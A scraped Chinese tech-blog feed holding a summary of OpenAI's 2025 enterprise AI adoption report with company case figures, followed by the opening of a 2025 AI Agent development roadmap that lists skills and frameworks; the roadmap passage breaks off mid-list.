<h3 data-id="heading-4">使用强度与时间节省的相关性</h3>
<p>数据表明使用深度与产出成正比：节省超过 **「10 小时 / 周」**的员工，其消耗的 Intelligence Credits（衡量模型使用量的指标）是未节省时间员工的 <strong>「8 倍」</strong>。</p>
<p>高频用户倾向于使用多种模型和工具。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6fee49b5edb4608a943504e162578f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=UIw8nTWV2te3YmukW4ATswS2RRc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">各行业增长数据</h3>
<p>所有行业的采用率都在增长，中位数行业的客户增长超过 <strong>「6 倍」</strong>。</p>
<p>科技、医疗保健和制造业增长最快。</p>
<p>虽然金融和专业服务业的绝对规模最大，但新兴行业的追赶速度惊人。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9054e5f23cc74b34a92d0a78a82767d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=demxor0wsFgVokMxHo2KUz8wtbg%3D" alt="" loading="lazy"/></p>
<p>增长最快的行业排名</p>
<p>具体增长数据为：科技行业增长 <strong>「11 倍」</strong>，医疗保健增长 <strong>「8 倍」</strong>，制造业增长 <strong>「7 倍」</strong>。</p>
<p>这反映了这些行业正在大量产生和处理 AI 交互数据。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2735cc72353e4d6896ad92c95f9e58d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=Fru54plc8nOO5VHydh133OTMaZc%3D" alt="" loading="lazy"/></p>
<p>API 用例分布</p>
<p>非科技公司的 API 使用量增长了 <strong>「5 倍」</strong>。</p>
<p>在金融和专业服务领域，「数据分析、摘要与提取」均位列前五大 API 用例。</p>
<p>科技公司主要将 API 用于面向客户的应用（如应用内助手和搜索）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/488d3726156c416a8b06d0dac2f7140b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=sd4djl9Q0pqC8QxgSdAhyCIKuOo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6"><strong>「全球增长数据」</strong></h3>
<p>国际增长加速，澳大利亚、巴西、荷兰和法国的商业客户增长率均超过 <strong>「143%」</strong>。</p>
<p>非美国地区的 API 客户增长在过去 6 个月超过 <strong>「70%」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5323b4ab08f44f2b87a47bf4df74627~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=Y5tQDN60ZBaxX2iKEjY%2Fhzq8Dfo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7"><strong>「使用鸿沟（个人层面）」</strong></h3>
<p>数据揭示了惊人的使用差距：前 5% 的头部员工（Frontier workers）发送的消息总量是中位数员工的 <strong>「6 倍」</strong>。</p>
<p>特别是在**「数据分析」**功能上，头部员工的使用量是中位数员工的 <strong>「16 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a190ce555a2449387a494eda7595d06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=p9vXVXJSXsrwIIul1RDE7mTEikY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">任务层面的差距</h3>
<p>不同任务的差距各异：在**「编程」<strong>任务上，头部与中位数的差距最大，达 <strong>「17 倍」</strong>；在</strong>「分析与计算」**任务上，差距为 <strong>「10 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/336601edf2b045f4a377236121aaf4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=jQb22iRU1IFD6rtqJPW9qfXUJ%2F8%3D" alt="" loading="lazy"/></p>
<p>数据还显示，涉及约 7 种不同任务类型的用户，其节省的时间是仅涉及 4 种任务用户的 5 倍。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6c47d91e1ac449ab87cce34541e17f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=fZz834WnnTGE2WQGLh78KeJVyCQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">工具普及率与企业差距</h3>
<p>尽管工具已普及，仍有 <strong>「19%」</strong> 的月活跃用户从未尝试过「数据分析」功能。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e4d6395fa2146fa8a9f304a34230ec1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=B4%2FAhbTvD9QOThPXf9IT9BYJu20%3D" alt="" loading="lazy"/></p>
<p>在企业层面，头部企业（Frontier firms）每席位的消息量是中位数企业的 **2 倍，**且发送给 Custom GPTs（代表标准化工作流）的消息量是中位数企业的 <strong>「7 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31fd6d2f68634221a20fa8f596d1b7a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=XhryzqvQcENbzAmVljgO4Q4FOqk%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7af929b182e4ebbb11948ad9d9c28f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=71o3SRBpjt8zUsEbVfjVOK6YyhE%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「商业影响概览」</strong></p>
<p>引用 BCG 的研究数据：AI 领先企业的收入增长是平均水平的 <strong>「1.7 倍」</strong>，股东总回报是 <strong>「3.6 倍」</strong>。</p>
<p>以下为具体案例。</p>
<p>Intercom 案例数据</p>
<p>使用 Realtime API 后，Intercom 的语音延迟降低了 <strong>「48%」</strong>，AI 能够端到端解决 <strong>「53%」</strong> 的电话咨询，人工处理后的通话时长缩短了 <strong>「40%」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a7d3039ddb34742bfbcd9d223f1250d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=zDBg80BhNMF9ZpCHSM1xPjHAYnw%3D" alt="" loading="lazy"/></p>
<p>Lowe's 案例数据</p>
<p>Lowe's 的 AI 工具每月回答近 **「100 万」**个问题。</p>
<p>在线客户与 AI 互动后的转化率翻了 <strong>「2 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ca4fa8c3e94ceabda319bc88b83c40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=SWELUmZDMP0Rs6zjWi6N99xEK5s%3D" alt="" loading="lazy"/></p>
<p>Indeed 案例数据</p>
<p>AI 辅助的邀请使求职申请增加了 <strong>「20%」</strong>，下游成功率（面试和录用）提高了 <strong>「13%」</strong>。</p>
<p>使用 AI 职业教练的求职者找到相关工作的速度快了 <strong>「7 倍」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/503faaca7d564bf08254b00d2a5a9193~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=l2qAW0yj0KsfWDMFOiOkNzG%2B30E%3D" alt="" loading="lazy"/></p>
<p>BBVA 案例数据</p>
<p>BBVA 的法律 AI 聊天机器人每年自动处理超过 <strong>「9,000」</strong> 个查询，帮助完成了超过 <strong>「11,000」</strong> 个法律验证，贡献了法律服务部门年度储蓄 KPI 的 <strong>「26%」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e387ecd713d4e2f94d1c510f8f0b58f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=HEzGB3YKz%2FBFXyEZ%2F%2FNa9TWJR1o%3D" alt="" loading="lazy"/></p>
<p>OscarHealth 案例数据</p>
<p>Oscar 的 AI 能够即时回答 <strong>「58%」</strong> 的福利问题，并能在无需人工干预的情况下处理 <strong>「39%」</strong> 的福利相关消息，这得益于 AI 与医疗记录和理赔**「数据」**的深度集成。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed748f4012584ac6ba0f4485043bf1fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=W8KY45WqGnFgiIa7H4aPpcLnDtM%3D" alt="" loading="lazy"/></p>
<p>Moderna 案例数据</p>
<p>Moderna 利用 AI 处理庞大的证据包（有时长达 <strong>「300 页」<strong>的数据），将目标产品概况（TPP）的起草和分析流程从数周压缩至</strong>「数小时」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7202a0b1c9524601940351c56497b184~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=SKUHzLteeygstunI1zQ%2FeJvJB04%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/292f29927bee417b917065057751cf75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=aPL4Lr6Zz%2BiyWC%2BIi%2Btl2XkaJoI%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「最佳实践与数据准备」</strong></p>
<p>数据准备是关键瓶颈：目前仍有约 <strong>「1/4」</strong> 的企业尚未开启连接器（Connectors）以赋予 AI 访问内部数据的权限。</p>
<p>成功的企业通常会建立 API 并将制度性知识编码化。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f70203d6bdde46e5929dbdafc7effc17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=S480lutydfz%2BfE9lL6wfSi71uXs%3D" alt="" loading="lazy"/></p>
<p>总结指出，深度使用至关重要。</p>
<p>使用数据分析、API 和推理模型等高级工具的员工报告了更高的生产力收益。</p>
<p>AI 正将编程和分析任务扩展到传统专家角色之外。</p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fthe-state-of-enterprise-ai-2025-report%2F" target="_blank" title="https://openai.com/index/the-state-of-enterprise-ai-2025-report/" ref="nofollow noopener noreferrer">openai.com/index/the-s…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftechcrunch.com%2F2025%2F12%2F08%2Fopenai-boasts-enterprise-win-days-after-internal-code-red-on-google-threat%2F" target="_blank" title="https://techcrunch.com/2025/12/08/openai-boasts-enterprise-win-days-after-internal-code-red-on-google-threat/" ref="nofollow noopener noreferrer">techcrunch.com/2025/12/08/…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agent开发路线图2025：从入门到精通，一文读懂智能体技术]]></title>    <link>https://juejin.cn/post/7581786379803738147</link>    <guid>https://juejin.cn/post/7581786379803738147</guid>    <pubDate>2025-12-10T03:24:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581786379803738147" data-draft-id="7581888578508144667" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agent开发路线图2025：从入门到精通，一文读懂智能体技术"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-10T03:24:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agent开发路线图2025：从入门到精通，一文读懂智能体技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:24:23.000Z" title="Wed Dec 10 2025 03:24:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<p>今天，我们将通过一份2025年AI Agent开发路线图，全面解析Agent开发领域的核心技术栈和发展路径。</p>
<h2 data-id="heading-0">什么是AI Agent？</h2>
<p>不只是聊天机器人。AI Agent与传统聊天机器人的根本区别在于<strong>自主性</strong>。一个真正的AI Agent能够理解复杂目标，制定计划，使用工具执行任务，并根据结果调整策略——这一切只需要你给出一个高级指令。</p>
<p>想象一下，你告诉Agent："帮我分析一下新能源汽车市场的最新趋势，并在周五前准备一份10页的报告"。一个真正的AI Agent会自主完成：搜索最新行业数据、分析竞争对手信息、制作图表并生成完整报告。</p>
<h2 data-id="heading-1">核心开发层次全解析</h2>
<h3 data-id="heading-2">编程与提示工程</h3>
<p>任何AI Agent开发都从这里开始。<strong>Python</strong>仍然是首选语言，但JavaScript/TypeScript的使用也在增长。除了基础编程能力，提示工程是关键技能。</p>

















<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>编程与提示</strong></td><td>编程语言（如基础语法）；脚本与自动化（如API请求、文件处理）；提示概念（如提示工程、思维链提示）</td><td>异步编程；网络抓取；多 Agent提示；目标导向提示；自我批判与重试循环；反思循环</td><td>Python（首选）；JavaScript；TypeScript；Shell/Bash；HTTP/JSON库（如requests in Python）；文件处理库（如os, pathlib）；异步库（如asyncio）；网络抓取库（如BeautifulSoup, Scrapy）</td></tr></tbody></table>
<h3 data-id="heading-3">AI Agent基础架构</h3>
<p>理解AI Agent的基本构成要素是核心：LLM作为 Agent的大脑，负责决策和推理；工具作为Agent的手脚，允许它与外界交互；记忆系统存储Agent的经验；规划器负责制定和执行计划。</p>

















<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>AI Agent基础</strong></td><td>AI Agent定义；自治 vs. 半自治 Agent； Agent组件（如LLM、工具、记忆、规划器）</td><td>Agent架构设计</td><td>LangChain（ Agent框架）；LlamaIndex（数据索引与 Agent）；Haystack（搜索 Agent）；Semantic Kernel（微软 Agent框架）；AutoGen（多 Agent）；CrewAI（团队 Agent）</td></tr></tbody></table>
<h3 data-id="heading-4">LLM调用与工具集成</h3>
<p>LLM调用是Agent工作的基础，而工具调用则是Agent技术的杀手级功能。通过工具，Agent可以执行代码计算、进行网络搜索、查询数据库、操作浏览器和调用任何API接口。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>LLM调用</strong></td><td>LLM API调用；提示模板（如动态提示、条件提示）</td><td>高级调用（如流式传输、批量/并行调用、回调/钩子）；提示链</td><td>OpenAI API；Anthropic API；Google AI；Cohere；Grok；本地LLM（如Ollama, LM Studio）；LangChain的LLM集成模块</td></tr><tr><td><strong>工具调用</strong></td><td>工具集成（如自定义工具、预构建工具）；工具类型（如搜索、计算、代码执行）</td><td>浏览器自动化；数据库查询；外部API集成</td><td>LangChain Tools；LlamaIndex Tools；Hugging Face Agents；Selenium（浏览器）；SQLAlchemy（数据库）；各种API SDK</td></tr></tbody></table>
<h3 data-id="heading-5">RAG与高级推理</h3>
<p>检索增强生成（RAG）技术让Agent能够访问特定领域知识，而不需要重新训练模型。规划与推理能力则决定了Agent处理复杂任务的智能水平。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>检索增强生成（RAG）</strong></td><td>嵌入模型；向量存储；简单RAG</td><td>高级RAG（如查询重写、重新排名）； AgentRAG</td><td>OpenAI Embeddings；Sentence Transformers；Cohere Embeddings；FAISS（本地向量库）；Pinecone/Weaviate/Chroma/Milvus（托管向量DB）</td></tr><tr><td><strong>规划与推理</strong></td><td>规划技术（如ReAct, Plan-and-Solve）；推理引擎（如LLM作为推理器）</td><td>Tree of Thoughts；Graph-based Planning；自问自答；辩论式推理</td><td>LangChain的ReAct链；自定义LLM推理模块</td></tr></tbody></table>
<h3 data-id="heading-6">多Agent系统与状态管理</h3>
<p>单个Agent能力有限，但多Agent系统可以完成惊人复杂的任务。记忆与状态管理确保了Agent能够保持连续性和学习能力。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>多 Agent系统</strong></td><td>Agent协作（如分层 Agent、辩论 Agent）</td><td>合作 Agent</td><td>AutoGen；CrewAI；Multi-Agent LangChain</td></tr><tr><td><strong>记忆与状态管理</strong></td><td>记忆类型（如短期/长期记忆、共享记忆）；状态管理（如会话状态）</td><td>持久化状态</td><td>Redis（缓存记忆）；SQL Databases（如SQLite/PostgreSQL）；Vector Stores for Memory（如Pinecone用于长期记忆）</td></tr></tbody></table>
<h3 data-id="heading-7">用户界面与部署</h3>
<p>优秀的用户界面让Agent能力更容易被使用者接受，而稳健的部署方案是生产环境应用的基础。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>用户界面</strong></td><td>UI框架；交互（如聊天界面）</td><td>多模态输入；实时反馈</td><td>Streamlit/Gradio/Chainlit（快速原型）；Flask/Django（后端UI）；React/Vue（前端UI）</td></tr><tr><td><strong>部署</strong></td><td>API部署；Agent托管服务</td><td>无服务器函数；向量DB托管</td><td>FastAPI/Streamlit/Gradio（API/UI）；Docker；Kubernetes；Replit/Modal（托管）；Pinecone等向量DB服务</td></tr></tbody></table>
<h3 data-id="heading-8">监控评估与安全治理</h3>
<p>随着Agent能力增强，监控评估和安全治理变得至关重要。这不仅关系到系统稳定性，也涉及到伦理和法律合规问题。</p>























<table><thead><tr><th>层次名称</th><th>必须做</th><th>可选</th><th>工具/技术</th></tr></thead><tbody><tr><td><strong>监控与评估</strong></td><td>Agent评估指标；人机环路反馈</td><td>日志/追踪；自动评估循环；自定义仪表板</td><td>LangSmith（LangChain监控）；OpenTelemetry（追踪）；Prometheus/Grafana（指标监控）</td></tr><tr><td><strong>安全与治理</strong></td><td>提示注入保护；API密钥管理；用户认证</td><td>基于角色的访问控制（RBAC）；输出过滤；红队测试；数据隐私与合规</td><td>自定义防护提示；密钥管理工具（如Vault）；Auth0/OAuth（认证）；RBAC库（如Casbin）；合规模块（如GDPR工具）</td></tr></tbody></table>
<h2 data-id="heading-9">2025年趋势展望</h2>
<ul>
<li>本地化部署（Ollama等工具让本地运行大模型成为可能）</li>
<li>多模态融合（Agent不仅能处理文本，还能理解图像、音频）</li>
<li>专业化发展（领域特定Agent将超过通用Agent）</li>
<li>安全优先（随着应用深入，安全性将成为核心考量）</li>
</ul>
<h2 data-id="heading-10">如何开始你的AI Agent开发之旅？</h2>
<p>如果你是初学者，建议按照以下路径学习：</p>
<ol>
<li>掌握Python基础和API调用；</li>
<li>学习提示工程基础；</li>
<li>尝试LangChain等框架构建简单Agent；</li>
<li>集成工具扩展Agent能力；</li>
